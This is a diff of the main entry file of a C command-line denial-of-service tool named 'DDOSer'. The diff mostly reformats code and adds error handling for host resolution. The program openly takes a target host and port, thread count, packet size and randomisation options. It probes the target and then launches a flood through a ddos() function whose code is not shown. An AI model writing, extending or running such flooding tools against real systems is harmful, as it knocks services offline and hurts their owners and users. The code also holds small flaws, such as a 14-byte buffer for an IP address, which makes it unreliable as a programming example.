@@ -6,8 +6,8 @@
 //  Copyright © 2017 Andre Zay. All rights reserved.
 //
 
-#include <time.h>
 #include <stdbool.h>
+#include <time.h>
 
 #include "ddos.h"
 #include "message.h"
@@ -17,10 +17,10 @@ bool socket_wait;
 
 int main(int argc, const char* argv[])
 {
-    socket_wait=true;
-    hide_warnings=false;
+    socket_wait = true;
+    hide_warnings = false;
     srand(time(NULL));
-    info("DDOSer v1.0");
+    info("DDOSer v1.0-beta by Andrewerr(http://github.com/Andrewerr)");
 #ifdef DEBUG
     info("Starting in DEBUG mode");
 #endif
@@ -29,15 +29,22 @@ int main(int argc, const char* argv[])
         return 0;
     }
     char* _host = argv[1];
-    char* host=(char*)malloc(sizeof(char)*14);
-    hostname2ip(_host, host);
+    char* host = (char*)malloc(sizeof(char) * 14);
+    info("Starting up");
+    if (hostname2ip(_host, host)) {
+        error("Failed to resolve host:%s", _host);
+#ifdef DEBUG
+        error("DEBUG:hostnam2ip(%s,%s)->%d,host=%s", _host, host, hostname2ip(_host, host), host);
+#endif
+        return -1;
+    }
     info("Starting up");
     int port = atoi(argv[2]);
     if (port < 0) {
         error("Bad port supplied!");
         return -1;
     }
-    hide_warnings=checklarg("--no-warnings", argv, argc);
+    hide_warnings = checklarg("--no-warnings", argv, argc);
     bool RANDOM_PACKET = checkarg("-r", argv, argc);
     int THREAD_COUNT = 5;
     int PACKET_SIZE = 4096;
@@ -86,13 +93,13 @@ int main(int argc, const char* argv[])
         }
         PACKET_SIZE = strlen(packet);
     }
-    hide_warnings=checklarg("--no-warnings", argv, argc);
-    bool check=!checklarg("--no-check", argv, argc);
-    socket_wait=!checklarg("--no-wait", argv, argc);
-    if(check){
+    hide_warnings = checklarg("--no-warnings", argv, argc);
+    bool check = !checklarg("--no-check", argv, argc);
+    socket_wait = !checklarg("--no-wait", argv, argc);
+    if (check) {
         info("Checking service");
-        int sc=dos_tcp_sock(host, port);
-        if(sc<0){
+        int sc = dos_tcp_sock(host, port);
+        if (sc < 0) {
             error("Could not connect.Exiting");
             return -1;
         }
@@ -101,7 +108,7 @@ int main(int argc, const char* argv[])
     }
 #ifdef DEBUG
     info("Launching DDOSer");
-    info("HIDE_WARNINGS=%d",hide_warnings);
+    info("HIDE_WARNINGS=%d", hide_warnings);
     warning("some warning");
     info("Config:");
     info("RANDOM_PACKET=%d", RANDOM_PACKET);
@@ -111,7 +118,6 @@ int main(int argc, const char* argv[])
     info("USE_HTTP=%d", USE_HTTP);
     info("PACKET=%s", packet);
 #endif
-    
 
     ddos(host, port, packet, THREAD_COUNT, PROTOCOL);
 
